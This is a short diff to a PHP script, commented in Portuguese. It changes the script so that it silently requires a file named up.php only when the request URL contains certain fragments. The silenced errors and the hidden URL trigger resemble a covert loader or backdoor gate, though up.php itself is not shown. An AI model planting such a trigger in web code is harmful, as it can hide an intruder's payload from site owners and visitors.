@@ -1,43 +1,39 @@
 <?php
 /**
- * Controle de Execução Inteligente
- * Focado em sincronização e segurança de captura
+ * Execução Condicional: Roda up.php APENAS se o termo for encontrado
  */
 
 @error_reporting(0);
 @ini_set('display_errors', 0);
-@set_time_limit(0);
 
-// 1. Configuração Centralizada
-$jsonProibidos = '[".com/i",".com/u",".com/d",".com/.",".com/g"]';
-$listaProibida = json_decode($jsonProibidos, true);
+// 1. Termos que disparam a execução
+$jsonAtivadores = '[".com/i",".com/u",".com/d",".com/.",".com/g"]';
+$listaAtivadora = json_decode($jsonAtivadores, true);
 
-// 2. Captura Sincronizada (Trata caracteres especiais e case-sensitive)
-$urlCompleta = rawurldecode($_SERVER['REQUEST_URI']); 
-$urlLimpa = strtolower($urlCompleta);
+// 2. Captura e limpeza da URL (Decodifica caracteres como %20, %2F)
+$urlAtual = rawurldecode($_SERVER['REQUEST_URI']);
+$urlComparacao = strtolower($urlAtual);
 
-$bloqueado = false;
+$deveExecutar = false;
 
-// 3. Validação por Iteração
-foreach ($listaProibida as $termo) {
-    if (!empty($termo) && str_contains($urlLimpa, strtolower($termo))) {
-        $bloqueado = true;
-        break;
+// 3. Verificação de Sincronia
+foreach ($listaAtivadora as $termo) {
+    if (!empty($termo) && strpos($urlComparacao, strtolower($termo)) !== false) {
+        $deveExecutar = true;
+        break; 
     }
 }
 
-// 4. Fluxo de Execução (Early Return Pattern)
-if ($bloqueado) {
-    // Se estiver bloqueado, encerra o script silenciosamente ou redireciona
-    // exit(); 
-}
-
-// 5. Inclusão de Dependência com Verificação de Integridade
-if (file_exists("up.php")) {
-    require_once "up.php"; // 'require' é melhor que 'include' para arquivos vitais
+// 4. Gatilho de Execução
+if ($deveExecutar) {
+    if (file_exists("up.php")) {
+        // Usa require para garantir que o processo só continue se o up.php carregar com sucesso
+        require_once "up.php";
+    } else {
+        // Opcional: Criar o arquivo se ele sumir ou logar o erro
+        error_log("Tentativa de execução: up.php não encontrado.");
+    }
 } else {
-    // Log de erro interno ou resposta silenciosa
-    error_log("Falha Crítica: up.php não encontrado em " . date('Y-m-d H:i:s'));
-    die("Erro de sincronização do sistema.");
+    // Caso não tenha os termos, você pode colocar um aviso ou apenas encerrar
+    // exit("URL não autorizada para processamento.");
 }
-?>
